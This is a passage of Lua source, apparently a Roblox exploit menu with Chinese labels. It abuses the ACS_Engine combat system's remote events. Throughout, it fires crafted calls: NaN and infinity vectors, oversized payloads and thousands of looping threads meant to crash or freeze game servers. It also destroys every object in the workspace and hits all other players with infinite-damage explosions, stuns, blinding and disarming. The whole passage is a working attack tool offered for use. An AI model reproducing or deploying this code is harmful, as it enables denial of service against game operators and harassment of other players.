                {CFrame = {}, Size = {}}
            )
        end)
        notify("破拆", "已尝试全局破拆", 2)
    end)
    
    breachSection:Button("破坏所有物体", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        pcall(function()
            ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                999,
                {Fortified = Workspace:GetDescendants(), Destroyable = Workspace:GetDescendants()},
                CFrame.new(),
                CFrame.new(),
                {CFrame = CFrame.new(), Size = {X = 999, Y = 999, Z = 999}}
            )
        end)
        notify("破拆", "已尝试破坏所有物体", 2)
    end)
    
    breachSection:Button("破坏玩家建筑", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        local buildings = {}
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("Model") and v:FindFirstChild("Humanoid") == nil then
                table.insert(buildings, v)
            end
        end
        pcall(function()
            ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                50,
                {Fortified = buildings, Destroyable = buildings},
                CFrame.new(),
                CFrame.new(),
                {CFrame = CFrame.new(), Size = {X = 50, Y = 50, Z = 50}}
            )
        end)
        notify("破拆", "已尝试破坏玩家建筑", 2)
    end)
    
    local spamSection = acsTab:section("全局干扰", false)
    
    spamSection:Toggle("全局压制干扰", "acs_suppress", false, function(state)
        local suppressionEvent = getSuppressionEvent()
        if not suppressionEvent then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        if state then
            config.suppressionLoop = task.spawn(function()
                while config.suppressionLoop do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            pcall(function()
                                suppressionEvent:FireServer(player, 666, 666, 666)
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("全局干扰", "已开启全局压制", 2)
        else
            if config.suppressionLoop then 
                task.cancel(config.suppressionLoop) 
                config.suppressionLoop = nil 
            end
            notify("全局干扰", "已关闭全局压制", 2)
        end
    end)
    
    local autoSuppressEnabled = false
    spamSection:Toggle("自动压制循环", "auto_suppress", false, function(state)
        autoSuppressEnabled = state
        local suppressionEvent = getSuppressionEvent()
        if not suppressionEvent then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        if state then
            config.autoSuppressLoop = task.spawn(function()
                while autoSuppressEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            pcall(function()
                                suppressionEvent:FireServer(player, 999, 999, 999)
                            end)
                        end
                    end
                    task.wait(1)
                end
            end)
            notify("自动压制", "已开启自动压制循环", 2)
        else
            if config.autoSuppressLoop then
                task.cancel(config.autoSuppressLoop)
                config.autoSuppressLoop = nil
            end
            notify("自动压制", "已关闭自动压制循环", 2)
        end
    end)
    
    spamSection:Toggle("全局子弹呼啸", "acs_whizz", false, function(state)
        local whizzEvent = getWhizzEvent()
        if not whizzEvent then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        if state then
            config.whizzLoop = task.spawn(function()
                while config.whizzLoop do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            pcall(function()
                                whizzEvent:FireServer(player)
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("全局干扰", "已开启全局子弹呼啸", 2)
        else
            if config.whizzLoop then 
                task.cancel(config.whizzLoop) 
                config.whizzLoop = nil 
            end
            notify("全局干扰", "已关闭全局子弹呼啸", 2)
        end
    end)
    
    local autoWhizzEnabled = false
    spamSection:Toggle("自动呼啸循环", "auto_whizz", false, function(state)
        autoWhizzEnabled = state
        local whizzEvent = getWhizzEvent()
        if not whizzEvent then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        if state then
            config.autoWhizzLoop = task.spawn(function()
                while autoWhizzEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            pcall(function()
                                whizzEvent:FireServer(player)
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("自动呼啸", "已开启自动呼啸循环", 2)
        else
            if config.autoWhizzLoop then
                task.cancel(config.autoWhizzLoop)
                config.autoWhizzLoop = nil
            end
            notify("自动呼啸", "已关闭自动呼啸循环", 2)
        end
    end)
    
    spamSection:Button("崩溃服务器 (NaN)", function()
        if not config.detectedACS.Eventos.ServerBullet then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        for i = 1, 30 do
            task.spawn(function()
                while true do
                    pcall(function()
                        ReplicatedStorage["ACS_Engine"].Eventos.ServerBullet:FireServer(
                            Vector3.new(0/0, 0/0, 0/0),
                            Vector3.new(0/0, 0/0, 0/0)
                        )
                    end)
                    task.wait()
                end
            end)
        end
        notify("警告", "已尝试崩溃服务器", 2)
    end)
    
    spamSection:Button("服务器卡顿攻击", function()
        if not config.detectedACS.Eventos.ServerBullet then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        for i = 1, 50 do
            task.spawn(function()
                for j = 1, 100 do
                    pcall(function()
                        ReplicatedStorage["ACS_Engine"].Eventos.ServerBullet:FireServer(
                            Vector3.new(math.random(), math.random(), math.random()),
                            Vector3.new(math.random(), math.random(), math.random())
                        )
                    end)
                end
            end)
        end
        notify("警告", "已尝试服务器卡顿攻击", 2)
    end)
    
    spamSection:Button("服务器延迟攻击", function()
        if not config.detectedACS.Eventos.ServerBullet then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        for i = 1, 100 do
            task.spawn(function()
                for j = 1, 50 do
                    pcall(function()
                        ReplicatedStorage["ACS_Engine"].Eventos.ServerBullet:FireServer(
                            Vector3.new(1/0, 1/0, 1/0),
                            Vector3.new(1/0, 1/0, 1/0)
                        )
                    end)
                end
            end)
        end
        notify("警告", "已尝试服务器延迟攻击", 2)
    end)
    
    spamSection:Button("完全卡死服务器", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 500 do
            task.spawn(function()
                while true do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                        if eventos.Damage then
                            eventos.Damage:FireServer(nil, 0/0, 0/0, 0/0)
                        end
                        if eventos.Suppression then
                            eventos.Suppression:FireServer(nil, 1/0, 1/0, 1/0)
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已开始攻击服务器，服务器将完全卡死", 2)
    end)
    
    spamSection:Button("超级NaN风暴", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 1000 do
            task.spawn(function()
                while true do
                    pcall(function()
                        for k = 1, 10 do
                            if eventos.ServerBullet then
                                eventos.ServerBullet:FireServer(
                                    Vector3.new(0/0, 0/0, 0/0),
                                    Vector3.new(0/0, 0/0, 0/0)
                                )
                            end
                            if eventos.Damage then
                                eventos.Damage:FireServer(nil, 0/0, 0/0, 0/0)
                            end
                            if eventos.Suppression then
                                eventos.Suppression:FireServer(nil, 0/0, 0/0, 0/0)
                            end
                            if eventos.Whizz then
                                eventos.Whizz:FireServer(nil, 0/0, 0/0)
                            end
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已启动超级NaN风暴", 2)
    end)
    
    spamSection:Button("内存炸弹", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        local hugeData = string.rep("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 1000)
        
        for i = 1, 200 do
            task.spawn(function()
                while true do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0),
                                hugeData
                            )
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已启动内存炸弹攻击", 2)
    end)
    
    spamSection:Button("无限递归崩溃", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        local function recursiveCrash(count)
            if count > 500 then return end
            pcall(function()
                if eventos.ServerBullet then
                    eventos.ServerBullet:FireServer(
                        Vector3.new(0/0, 0/0, 0/0),
                        Vector3.new(0/0, 0/0, 0/0)
                    )
                end
            end)
            recursiveCrash(count + 1)
        end
        
        for i = 1, 100 do
            task.spawn(function()
                recursiveCrash(0)
            end)
        end
        
        notify("警告", "已启动无限递归崩溃", 2)
    end)
    
    spamSection:Button("混合超载攻击", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 300 do
            task.spawn(function()
                while true do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                        if eventos.Damage then
                            eventos.Damage:FireServer(nil, 1/0, 1/0, 1/0)
                        end
                        if eventos.Breach then
                            eventos.Breach:FireServer(
                                0/0,
                                {Fortified = {}, Destroyable = Workspace},
                                CFrame.new(),
                                CFrame.new(),
                                {CFrame = CFrame.new(), Size = {X = 1/0, Y = 1/0, Z = 1/0}}
                            )
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        for i = 1, 10000 do
            pcall(function()
                if eventos.ServerBullet then
                    eventos.ServerBullet:FireServer(
                        Vector3.new(0/0, 0/0, 0/0),
                        Vector3.new(0/0, 0/0, 0/0)
                    )
                end
            end)
        end
        
        notify("警告", "已启动混合超载攻击", 2)
    end)
    
    local dataFloodEnabled = false
    local dataFloodLoop = nil
    spamSection:Toggle("数据洪流攻击", "data_flood", false, function(state)
        dataFloodEnabled = state
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        if state then
            dataFloodLoop = task.spawn(function()
                while dataFloodEnabled do
                    for j = 1, 200 do
                        pcall(function()
                            if eventos.ServerBullet then
                                eventos.ServerBullet:FireServer(
                                    Vector3.new(0/0, 0/0, 0/0),
                                    Vector3.new(0/0, 0/0, 0/0)
                                )
                            end
                            if eventos.Damage then
                                eventos.Damage:FireServer(nil, 0/0, 0/0, 0/0)
                            end
                            if eventos.Suppression then
                                eventos.Suppression:FireServer(nil, 0/0, 0/0, 0/0)
                            end
                        end)
                    end
                    task.wait()
                end
            end)
            notify("警告", "已开启数据洪流攻击", 2)
        else
            if dataFloodLoop then
                task.cancel(dataFloodLoop)
                dataFloodLoop = nil
            end
            notify("警告", "已关闭数据洪流攻击", 2)
        end
    end)
    
    spamSection:Button("破拆风暴", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        
        for i = 1, 100 do
            task.spawn(function()
                while true do
                    pcall(function()
                        ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                            999,
                            {Fortified = Workspace:GetDescendants(), Destroyable = Workspace:GetDescendants()},
                            CFrame.new(),
                            CFrame.new(),
                            {CFrame = CFrame.new(), Size = {X = 999, Y = 999, Z = 999}}
                        )
                    end)
                    task.wait(0.1)
                end
            end)
        end
        
        notify("警告", "已启动破拆风暴", 2)
    end)
    
    spamSection:Button("全事件轰炸", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 500 do
            task.spawn(function()
                while true do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                        if eventos.Damage then
                            eventos.Damage:FireServer(nil, 0/0, 0/0, 0/0)
                        end
                        if eventos.Suppression then
                            eventos.Suppression:FireServer(nil, 1/0, 1/0, 1/0)
                        end
                        if eventos.Whizz then
                            eventos.Whizz:FireServer(nil, 0/0, 0/0)
                        end
                        if eventos.Breach then
                            eventos.Breach:FireServer(
                                0/0,
                                {Fortified = {}, Destroyable = Workspace},
                                CFrame.new(),
                                CFrame.new(),
                                {CFrame = CFrame.new(), Size = {X = 1/0, Y = 1/0, Z = 1/0}}
                            )
                        end
                        if eventos.Recarregar then
                            eventos.Recarregar:FireServer(nil, 0/0, 0/0)
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已启动全事件轰炸", 2)
    end)
    
    spamSection:Button("极速崩溃", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 2000 do
            task.spawn(function()
                for j = 1, 500 do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                    end)
                end
            end)
        end
        
        notify("警告", "已启动极速崩溃攻击", 2)
    end)
    
    local infLoopEnabled = false
    local infLoop = nil
    spamSection:Toggle("无限循环请求", "inf_loop", false, function(state)
        infLoopEnabled = state
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        if state then
            infLoop = task.spawn(function()
                while infLoopEnabled do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                    end)
                    task.wait()
                end
            end)
            notify("警告", "已开启无限循环请求", 2)
        else
            if infLoop then
                task.cancel(infLoop)
                infLoop = nil
            end
            notify("警告", "已关闭无限循环请求", 2)
        end
    end)
    
    spamSection:Button("资源耗尽攻击", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 500 do
            task.spawn(function()
                local count = 0
                while true do
                    count = count + 1
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, count, 0/0),
                                Vector3.new(0/0, 0/0, count)
                            )
                        end
                        if eventos.Damage then
                            eventos.Damage:FireServer(nil, count * 0/0, 0/0, 0/0)
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已启动资源耗尽攻击", 2)
    end)
    
    spamSection:Button("快速重启攻击", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 100 do
            task.spawn(function()
                for j = 1, 1000 do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                    end)
                end
            end)
        end
        
        for i = 1, 100 do
            pcall(function()
                ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                    999999,
                    {Fortified = Workspace:GetDescendants(), Destroyable = Workspace:GetDescendants()},
                    CFrame.new(),
                    CFrame.new(),
                    {CFrame = CFrame.new(), Size = {X = 999999, Y = 999999, Z = 999999}}
                )
            end)
        end
        
        notify("警告", "已启动快速重启攻击", 2)
    end)
    
    spamSection:Button("延时爆炸攻击", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        task.spawn(function()
            task.wait(5)
            for i = 1, 1000 do
                task.spawn(function()
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                    end)
                end)
            end
            notify("警告", "延时爆炸已触发", 2)
        end)
        
        notify("警告", "5秒后将触发爆炸攻击", 2)
    end)
    
    local hitSection = acsTab:section("全图Hit爆炸", false)
    
    local hitExplosionEnabled = false
    local hitExplosionLoop = nil
    
    hitSection:Toggle("全图Hit爆炸循环", "hit_explosion", false, function(state)
        hitExplosionEnabled = state
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos or not eventos.Hit then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        
        if state then
            hitExplosionLoop = task.spawn(function()
                while hitExplosionEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        pcall(function()
                            local char = player.Character
                            local root = char and char:FindFirstChild("HumanoidRootPart")
                            if root then
                                local args = {
                                    root.Position,
                                    Instance.new("Part"),
                                    Vector3.yAxis,
                                    Enum.Material.Plastic,
                                    {
                                        ExPressure = 999999,
                                        DestroyJointRadiusPercent = 1,
                                        ExpRadius = 9e9,
                                        ExplosionDamagesTerrain = true,
                                        ExplosiveHit = true,
                                        ExplosionDamage = math.huge
                                    }
                                }
                                eventos.Hit:FireServer(unpack(args))
                            end
                        end)
                    end
                    task.wait(0.05)
                end
            end)
            notify("全图Hit爆炸", "已开启全图Hit爆炸循环", 2)
        else
            if hitExplosionLoop then
                task.cancel(hitExplosionLoop)
                hitExplosionLoop = nil
            end
            notify("全图Hit爆炸", "已关闭全图Hit爆炸循环", 2)
        end
    end)
    
    hitSection:Button("单次全图Hit爆炸", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos or not eventos.Hit then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            local char = player.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root then
                local args = {
                    root.Position,
                    Instance.new("Part"),
                    Vector3.yAxis,
                    Enum.Material.Plastic,
                    {
                        ExPressure = 999999,
                        DestroyJointRadiusPercent = 1,
                        ExpRadius = 9e9,
                        ExplosionDamagesTerrain = true,
                        ExplosiveHit = true,
                        ExplosionDamage = math.huge
                    }
                }
                eventos.Hit:FireServer(unpack(args))
            end
        end
        notify("全图Hit爆炸", "已触发单次全图Hit爆炸", 2)
    end)
    
    local effectSection = acsTab:section("全图元素效果", false)
    
    local rs = game:GetService("ReplicatedStorage")
    local acs = rs:FindFirstChild("ACS_Engine")
    local eventos = acs and acs:FindFirstChild("Eventos")
    
    local burnEnabled = false
    local freezeEnabled = false
    local lightningEnabled = false
    local poisonEnabled = false
    local knockbackEnabled = false
    local stunEnabled = false
    local confusionEnabled = false
    
    local burnLoop = nil
    local freezeLoop = nil
    local lightningLoop = nil
    local poisonLoop = nil
    local knockbackLoop = nil
    local stunLoop = nil
    local confusionLoop = nil
    
    effectSection:Toggle("全图燃烧效果", "burn_toggle", false, function(state)
        burnEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if burnLoop then task.cancel(burnLoop) end
            burnLoop = task.spawn(function()
                while burnEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 10,
                                    Fire = true,
                                    BurnTime = 10
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("燃烧", "已开启全图燃烧效果", 2)
        else
            if burnLoop then task.cancel(burnLoop); burnLoop = nil end
            notify("燃烧", "已关闭全图燃烧效果", 2)
        end
    end)
    
    effectSection:Toggle("全图冰冻效果", "freeze_toggle", false, function(state)
        freezeEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if freezeLoop then task.cancel(freezeLoop) end
            freezeLoop = task.spawn(function()
                while freezeEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 0,
                                    Freeze = true,
                                    FreezeTime = 5
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("冰冻", "已开启全图冰冻效果", 2)
        else
            if freezeLoop then task.cancel(freezeLoop); freezeLoop = nil end
            notify("冰冻", "已关闭全图冰冻效果", 2)
        end
    end)
    
    effectSection:Toggle("全图雷电效果", "lightning_toggle", false, function(state)
        lightningEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if lightningLoop then task.cancel(lightningLoop) end
            lightningLoop = task.spawn(function()
                while lightningEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 20,
                                    Lightning = true,
                                    LightningDamage = 50
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("雷电", "已开启全图雷电效果", 2)
        else
            if lightningLoop then task.cancel(lightningLoop); lightningLoop = nil end
            notify("雷电", "已关闭全图雷电效果", 2)
        end
    end)
    
    effectSection:Toggle("全图毒气效果", "poison_toggle", false, function(state)
        poisonEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if poisonLoop then task.cancel(poisonLoop) end
            poisonLoop = task.spawn(function()
                while poisonEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 5,
                                    Poison = true,
                                    PoisonTime = 15,
                                    PoisonDamage = 10
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("毒气", "已开启全图毒气效果", 2)
        else
            if poisonLoop then task.cancel(poisonLoop); poisonLoop = nil end
            notify("毒气", "已关闭全图毒气效果", 2)
        end
    end)
    
    effectSection:Toggle("全图击飞效果", "knockback_toggle", false, function(state)
        knockbackEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if knockbackLoop then task.cancel(knockbackLoop) end
            knockbackLoop = task.spawn(function()
                while knockbackEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 5000,
                                    DestroyJointRadiusPercent = 1,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 0,
                                    Knockback = true,
                                    KnockbackForce = 100
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.3)
                end
            end)
            notify("击飞", "已开启全图击飞效果", 2)
        else
            if knockbackLoop then task.cancel(knockbackLoop); knockbackLoop = nil end
            notify("击飞", "已关闭全图击飞效果", 2)
        end
    end)
    
    effectSection:Toggle("全图眩晕效果", "stun_toggle", false, function(state)
        stunEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if stunLoop then task.cancel(stunLoop) end
            stunLoop = task.spawn(function()
                while stunEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 0,
                                    Stun = true,
                                    StunTime = 3
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("眩晕", "已开启全图眩晕效果", 2)
        else
            if stunLoop then task.cancel(stunLoop); stunLoop = nil end
            notify("眩晕", "已关闭全图眩晕效果", 2)
        end
    end)
    
    effectSection:Toggle("全图混乱效果", "confusion_toggle", false, function(state)
        confusionEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if confusionLoop then task.cancel(confusionLoop) end
            confusionLoop = task.spawn(function()
                while confusionEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 0,
                                    Confusion = true,
                                    ConfusionTime = 8
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("混乱", "已开启全图混乱效果", 2)
        else
            if confusionLoop then task.cancel(confusionLoop); confusionLoop = nil end
            notify("混乱", "已关闭全图混乱效果", 2)
        end
    end)
    
    local extraSection = acsTab:section("额外漏洞攻击", false)
    
    local rs2 = game:GetService("ReplicatedStorage")
    local acs2 = rs2:FindFirstChild("ACS_Engine")
    local eventos2 = acs2 and acs2:FindFirstChild("Eventos")
    
    extraSection:Button("全图布娃娃效果", function()
        if not eventos2 or not eventos2:FindFirstChild("Ragdoll") then
            notify("错误", "未找到 Ragdoll 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Ragdoll:FireServer(player, true)
                end)
            end
        end
        notify("效果", "已对所有玩家施放布娃娃效果", 2)
    end)
    
    extraSection:Button("全图眩晕", function()
        if not eventos2 or not eventos2:FindFirstChild("Stun") then
            notify("错误", "未找到 Stun 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Stun:FireServer(player, 10)
                end)
            end
        end
        notify("效果", "已对所有玩家施放眩晕效果", 2)
    end)
    
    extraSection:Button("全图致盲", function()
        if not eventos2 or not eventos2:FindFirstChild("Blind") then
            notify("错误", "未找到 Blind 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Blind:FireServer(player, 10)
                end)
            end
        end
        notify("效果", "已对所有玩家施放致盲效果", 2)
    end)
    
    extraSection:Button("全图缴械", function()
        if not eventos2 or not eventos2:FindFirstChild("Disarm") then
            notify("错误", "未找到 Disarm 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Disarm:FireServer(player, 10)
                end)
            end
        end
        notify("效果", "已对所有玩家施放缴械效果", 2)
    end)
    
    extraSection:Button("全图减速", function()
        if not eventos2 or not eventos2:FindFirstChild("Slow") then
            notify("错误", "未找到 Slow 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Slow:FireServer(player, 0.3, 10)
                end)
            end
        end
        notify("效果", "已对所有玩家施放减速效果", 2)
    end)
    
    extraSection:Toggle("隐身模式", "invisible_toggle", false, function(state)
        if not eventos2 then
            notify("错误: 未找到 ACS 事件")
            return
        end
        
        if eventos2.Invisible then
            pcall(function()
                eventos2.Invisible:FireServer(LocalPlayer, state)
                notify(state and "已开启隐身" or "已关闭隐身")
            end)
        elseif eventos2.SetInvisible then
            pcall(function()
                eventos2.SetInvisible:FireServer(LocalPlayer, state)
                notify(state and "已开启隐身" or "已关闭隐身")
            end)
        elseif eventos2.Visible then
            pcall(function()
                eventos2.Visible:FireServer(LocalPlayer, not state)
                notify(state and "已开启隐身" or "已关闭隐身")
            end)
        else
            notify("错误: 未找到隐身事件")
        end
    end)
    
    extraSection:Button("瞬间换弹", function()
        if eventos2 and eventos2:FindFirstChild("Reload") then
            eventos2.Reload:FireServer(LocalPlayer)
            notify("尝试", "已尝试瞬间换弹", 2)
        else
            notify("错误", "未找到 Reload 事件", 2)
        end
    end)
    
